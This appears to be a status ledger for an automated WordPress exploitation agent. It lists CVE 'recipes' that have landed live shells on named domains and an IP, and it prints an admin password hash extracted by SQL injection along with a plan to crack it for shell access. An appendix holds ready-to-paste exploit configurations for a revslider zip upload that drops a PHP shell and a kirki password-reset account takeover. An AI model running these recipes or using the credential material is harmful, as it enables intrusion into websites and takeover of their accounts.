# Recipe status ledger — proven vs. unproven

**Updated:** 2026-07-23 · **Version:** v0.24.0
**Rule (from `current-PA-capabilities.txt`):** a recipe is "PROVEN" only if it produced a live `id`
(e.g. `uid=33(www-data)`) recorded in `~/.cache/pentest-agent/*.json`. A MATCH, a SQLi timing delta,
an OOB signal, or a green unit-test suite does **NOT** count.

This file is the durable reminder of what we've tried, what works, and what to check before
retrying a recipe — so we don't re-litigate the same dead ends or mistake unproven for proven.
**None of the unproven recipes are deleted** — they stay wired in and ready to fire; this ledger
records *why* each hasn't landed and what it would take.

---

## ✅ PROVEN — landed a live shell (5 CVE entries / 4 targets)

| Recipe | CVE | Registry | Target(s) | Vector |
|--------|-----|----------|-----------|--------|
| wp-file-manager | CVE-2020-25213 | RECIPES | xinference.nzmweb.com, 15.232.162.164 | Track-A unauth upload |
| wpdiscuz | CVE-2020-24186 | RECIPES | georgeagent.com | Track-A comment-image upload |
| king-addons | CVE-2025-6327 | RECIPES | king.ofpweb.com, :8093 | Track-A unauth upload |
| king-addons | CVE-2025-6325 | PRIVESC | king.ofpweb.com, :8093 | Track-B register-role → admin → upload |
| essential-addons-for-elementor-lite | CVE-2023-32243 | PRIVESC | kopirimba.xbrlink.com, :8090 | Track-B unauth pw-reset → admin → upload |

Note: king-addons is **one target, two CVEs** (both land) — that's why "5 entries / 4 landings".

---

## 🔑 CONFIRMED VULN, not a shell (active work — do NOT file under "fail")

| Recipe | CVE | Registry | Status |
|--------|-----|----------|--------|
| wp-google-map-plugin | CVE-2026-2580 | SQLI | Unauth blind SQLi **confirmed** on askgeorgeai.com (+5s delta). Credentials **already extracted**: `admin` / `$wp$2y$10$AUR59OCPTtyJCwiYUC.NM.20L0GNwT7wJxmOG0hWih1wcycVuzWLK`. Remaining: crack the `$wp$` bcrypt offline → Track-B shell. See `docs/HANDOFF-sqli-askgeorge.md`. |

---

## ⚠️ TRIED — won't land as-is on our lab (precondition/config, not a code bug)

- **kirki (CVE-2026-8206)** — **REMOVED from the codebase 2026-07-23** (see the removed-recipes
  appendix below for the restore block + reasons). Was precondition-blocked: `validate_nonce()`
  needs a nonce scoped to `KirkiComponentLibrary_kirki-forgot-password`, minted only on a
  ComponentLibrary forgot-password page xbrlink.com doesn't have; only ever "worked" via a
  root-computed nonce cheat, and it's a pw-reset OOB, not a direct shell.

| Recipe | CVE | Registry | Why it doesn't land · what would flip it |
|--------|-----|----------|------------------------------------------|
| breeze | CVE-2026-3844 | RECIPES | Recipe built (comment-avatar-ssrf mode) but **never verified**. Requires the non-default "Host Files Locally – Gravatars" setting ON + comments open; on cve-breeze:8092 the setting is OFF (no `breeze_*` options in DB). **To retry:** enable that setting + open comments on :8092, host a payload, run with `--callback-url`/`--callback-token`. |

---

## 🧪 BUILT but never live-fired — plugin simply isn't installed on the lab

These are **ready-to-fire assets**, not incompatible. They were built from real source/PoC and
unit-tested; they just haven't been run against a live target because the (mostly premium) plugin
isn't on any container. Drop the plugin in, then run.

| Recipe | CVE | Registry | Blocker |
|--------|-----|----------|---------|
| ninja-forms-uploads | CVE-2026-0740 | RECIPES | Premium Ninja Forms extension, not on wp.org; not installed anywhere. Scoped to `<=3.3.24`. |
| simple-file-list | CVE-2025-34085 | RECIPES | Built from SVN v4.2.2 source; not installed on any container. |
| lastudio-element-kit | CVE-2026-0920 | PRIVESC | Built from surviving 1.6.0 source + PoC (vuln 1.5.6.3 tag pulled from SVN); not installed. |
| opal-estate-pro | CVE-2025-6934 | PRIVESC | register-role recipe built + tested; plugin not installed. |
| wp-automatic | CVE-2024-27956 | SQLI | Premium ValvePress plugin; cve-wpauto:8091 has only akismet/hello. Drop licensed `wp-automatic.zip` in `cve-lab/plugins/` + re-provision. |

---

## 🪦 LEGACY / unproven

- **revslider (CVE-2014-9735)** — **REMOVED from the codebase 2026-07-23** (restore block in the
  appendix below). Never landed a shell (0 confirmed runs); deleted 2026-07-21, reappeared, removed
  again. Don't cite as working.

---

## 🗑️ REMOVED from the codebase (2026-07-23) — restorable from here

`kirki` and `revslider` were **removed from the toolkit** on 2026-07-23 (recipes + their
now-dead exclusive engine/fingerprint code + tests), because neither can land on the lab as-is
and both were dragging dead code. The generic `zip-extract` exploit mode and the bare-key JS
nonce regex were **kept** (they're generic engine capabilities, not kirki/revslider-specific).
`revslider_poc.py` (standalone PoC script) was also kept. To restore a recipe, paste its dict
back into the right registry in `wp/recipes.py` and re-add the supporting code noted below.

### revslider — CVE-2014-9735 (was in RECIPES)
```python
{
    "plugin": "revslider",
    "cve": "CVE-2014-9735",
    "affected": "<=3.0.95",
    "mode": "zip-extract",
    "method": "POST",
    "endpoint": "/wp-admin/admin-ajax.php",
    "params": {"action": "revslider_ajax_action", "client_action": "update_plugin"},
    "field": "update_file",
    "zip_inner_path": "revslider/{filename}",
    "upload_path": "/wp-content/plugins/revslider/temp/update_extract/revslider/{filename}",
    "source": "registry",
    "note": "revslider_ajax_action/update_plugin extracts an attacker zip; ship "
            "a PHP shell inside revslider/. Unauth in <=3.0.95.",
}
```
Also removed: `_revslider_version` + `_REVSLIDER_ASSET_VER` + the refiner call in `wp/fingerprint.py`
(revslider ships no readme, so version was recovered from asset `?ver=`/`release_log.txt`), the
`"revslider"` entry in `wp/plugins_common.py` COMMON_SLUGS, and the revslider tests in
`tests/test_fingerprint.py` + the recipe-presence test in `tests/test_exploit.py`. The `zip-extract`
engine mode + its engine test stay (recipe-less).

### kirki — CVE-2026-8206 (was in PRIVESC_RECIPES, kind `account-takeover-oob`)
```python
{
    "plugin": "kirki",
    "cve": "CVE-2026-8206",
    "affected": ">=6.0.0,<=6.0.6",
    "kind": "account-takeover-oob",
    "method": "POST",
    "endpoint": "/wp-json/KirkiComponentLibrary/v1/kirki-forgot-password",
    "target_user": "admin",
    "user_param": "username",
    "email_param": "email",
    "attacker_email": "pentest@mail.invalid",
    "extra_params": {
        "emailSubject": "Password Reset",
        "emailBody": '[{"type":"text","value":"Reset your password:\\n"},'
                     '{"type":"chip","value":"reset_link"}]',
    },
    "nonce_header": "X-WP-ELEMENT-NONCE",
    "success_marker": "Email sent",
    "source": "registry",
    "note": "Unauth arbitrary-email password reset (CVE-2026-8206). Reset link emailed to "
            "attacker. REQUIRES a Kirki ComponentLibrary page with a Forgot-Password element "
            "(source of the action-scoped nonce 'KirkiComponentLibrary_kirki-forgot-password'). "
            "Completable: --oob-nonce fires OOB; --oob-reset-key finishes reset → admin → webshell.",
}
```
Also removed: `_account_takeover_oob` + `complete_reset_key` + the `account-takeover-oob` dispatch in
`wp/privesc.py`; the `--oob-nonce` / `--oob-reset-key` / `--oob-login` CLI flags + their graph
handling + the OOB branch in `phase_track_b` in `pentest-agent.py`; and the OOB/kirki tests in
`tests/test_privesc.py`, `tests/test_recipes.py`, `tests/test_pentest_agent.py`. The generic
bare/unquoted-key JS nonce regex (`_harvest_js_nonce` / `_REST_NONCE`) stays — it's not kirki-specific.

To fully restore kirki you'd re-add all of the above (the recipe alone won't run without the
`account-takeover-oob` kind handler and the `--oob-*` flags).

---

## Tally (after the 2026-07-23 kirki + revslider removal)

- **Registry now:** 12 recipe entries (RECIPES 6 · PRIVESC 4 · SQLI 2)
- **Proven:** 5 CVE entries (4 targets) — unchanged
- **Confirmed-vuln-not-shell:** 1 (gmap SQLi — active)
- **Unproven still in registry:** 6 (breeze precondition-blocked · ninja-forms-uploads,
  simple-file-list, lastudio-element-kit, opal-estate-pro, wp-automatic = built-not-fired)
- **Removed (restorable from appendix):** 2 (kirki, revslider)
